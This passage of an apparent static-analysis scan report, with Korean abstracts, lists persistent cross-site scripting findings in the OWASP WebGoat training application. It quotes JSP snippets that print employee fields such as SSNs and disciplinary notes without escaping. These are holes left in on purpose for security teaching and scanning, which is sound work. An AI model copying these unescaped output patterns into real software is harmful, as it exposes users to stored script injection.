						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F7A43DA81C455332C8BDCD00281AEB00" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EFD9CA74198F071F0F611FBD0E82A6A2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 79 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>79</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;input name="&lt;%=RoleBasedAccessControl.DESCRIPTION%&gt;" type="text" class="lesson_text_db" value="&lt;%=employee.getPersonalDescription()%&gt;" size="58"/&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3A8E3BB2450E531B99FA728F81DEA043" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>StoredXss.java의 makeCurrent() 메서드가 247 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>247</LineStart>
<Snippet>
		TR row3 = new TR(new TD(new StringElement("Posted By:")));
		row3.addElement(new TD(new StringElement(results
			.getString(USER_COL))));
		t.addElement(row3);</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>224</LineStart>
<Snippet>	    statement.setString(1, getNameroot(s.getUserName()) + "%");
	    statement.setInt(2, messageNum);
	    ResultSet results = statement.executeQuery();

	    if ((results != null) &amp;&amp; results.first())</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4B98F2B79C242663D6E247CAB1360E64" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A92A223CF62CE32074CAB0E1ADCB0E5F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DCB48FD263ED052EF2B304CE02837445" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 79 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>79</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;input name="&lt;%=RoleBasedAccessControl.DESCRIPTION%&gt;" type="text" class="lesson_text_db" value="&lt;%=employee.getPersonalDescription()%&gt;" size="58"/&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1EF26AA923A37FA462795BC7093FB7AA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="633B4289FE9D8B2DE356DFF0BE4E1635" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 8 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>8</LineStart>
<Snippet>	Employee employee = (Employee) session.getAttribute("RoleBasedAccessControl.Employee");
%&gt;
		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt; - Edit Profile Page&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4B1064D4FD3175EFB5061F6299019C77" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7422F66EFE8CB3E1CC4C846728263534" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="943DEB8AF96E2E386ECFAB06E4889E96" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 79 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>79</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;input name="&lt;%=RoleBasedAccessControl.DESCRIPTION%&gt;" type="text" class="lesson_text_db" value="&lt;%=employee.getPersonalDescription()%&gt;" size="58"/&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AA44BBA755A92F22FCD1C4691B746551" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=SQLInjection.DISCIPLINARY_NOTES%&gt;"  cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7B53308E2AAA777F966C1BAD1F698552" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0016F96537FF75CC5690F6B372535ABC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9107EAD48026815661CF47A29AA83197" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B7ABCA16702F5573FBBBB7F650F9C3FF" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8C81E0F1007F94543DF8B1646FD724BD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 53 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0C823FC8D19DA58299F762F32F92EA5C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1DA1E6034FE666F5E155533F32502766" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
